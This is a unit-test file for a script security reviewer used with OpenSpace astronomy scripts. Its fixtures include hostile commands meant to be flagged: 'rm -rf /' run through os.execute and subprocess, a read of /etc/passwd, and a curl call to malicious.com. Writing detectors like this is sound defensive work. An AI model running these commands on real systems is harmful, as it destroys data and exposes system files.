import { describe, it, expect } from 'vitest';
import { reviewScript } from '../security-review.js';
import type { ScriptLanguage } from '../types.js';

describe('OpenSpace security-review', () => {
  describe('reviewScript', () => {
    const languages: ScriptLanguage[] = ['lua', 'javascript', 'python'];

    it('should return passed for safe scripts', () => {
      const safeScripts = [
        'openspace.setPropertyValue("NavigationHandler.Target", "Earth")',
        'openspace.time.setTime("2024-06-01T00:00:00")',
        'openspace.addSceneGraphNode("EarthNightLights")',
        'local x = 42\nprint(x)',
        '-- This is a comment\nopenspace.printInfo("Hello")',
      ];

      for (const lang of languages) {
        for (const script of safeScripts) {
          const result = reviewScript(script, lang);
          expect(result.passed, `lang=${lang} script=${script}`).toBe(true);
          expect(result.violations.length).toBe(0);
        }
      }
    });

    it('should detect critical os.execute in Lua', () => {
      const script = 'os.execute("rm -rf /")';
      const result = reviewScript(script, 'lua');
      expect(result.passed).toBe(false);
      expect(result.riskLevel).toBe('critical');
      expect(result.violations.length).toBeGreaterThanOrEqual(1);
      expect(result.violations[0].description).toContain('Shell command execution');
    });

    it('should detect critical child_process in JavaScript', () => {
      const script = 'require("child_process").execSync("ls")';
      const result = reviewScript(script, 'javascript');
      expect(result.passed).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should detect critical subprocess in Python', () => {
      const script = 'subprocess.run(["rm", "-rf", "/"])';
      const result = reviewScript(script, 'python');
      expect(result.passed).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should detect multiple violations and escalate to highest risk', () => {
      const script = 'os.execute("danger")\nrequire("fs")\neval("code")';
      const result = reviewScript(script, 'javascript');
      expect(result.passed).toBe(false);
      expect(result.riskLevel).toBe('critical');
      expect(result.violations.length).toBeGreaterThanOrEqual(1);
    });

    it('should report correct line numbers', () => {
      const script = [
        'local a = 1',
        'local b = 2',
        'os.execute("rm -rf /")',
        'local c = 3',
      ].join('\n');
      const result = reviewScript(script, 'lua');
      expect(result.violations.length).toBeGreaterThanOrEqual(1);
      expect(result.violations[0].line).toBe(3);
    });

    it('should report each violation with pattern and description', () => {
      const script = 'os.execute("test")';
      const result = reviewScript(script, 'lua');
      expect(result.violations.length).toBeGreaterThanOrEqual(1);
      expect(result.violations[0].pattern).toBeDefined();
      expect(result.violations[0].description).toBeDefined();
      expect(result.violations[0].riskLevel).toBeDefined();
      expect(result.violations[0].line).toBeGreaterThan(0);
    });

    it('should detect medium-risk os.exit in Lua', () => {
      const luaScript = 'os.exit(0)';
      const result = reviewScript(luaScript, 'lua');
      expect(result.passed).toBe(false);
      expect(result.riskLevel).toBe('medium');
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0].description).toContain('Process termination');
    });

    it('should handle empty script', () => {
      for (const lang of languages) {
        const result = reviewScript('', lang);
        expect(result.passed).toBe(true);
        expect(result.riskLevel).toBe('none');
        expect(result.violations.length).toBe(0);
      }
    });

    it('should handle multiline Lua with multiple danger patterns', () => {
      const script = [
        '-- astronomy script',
        'openspace.setPropertyValue("Nav.Target", "Mars")',
        'local file = io.open("/etc/passwd", "r")',
        'os.execute("curl http://malicious.com")',
        'dofile("/tmp/evil.lua")',
      ].join('\n');
      const result = reviewScript(script, 'lua');
      expect(result.passed).toBe(false);
      expect(result.riskLevel).toBe('critical');
      expect(result.violations.length).toBeGreaterThanOrEqual(3);
    });
  });
});
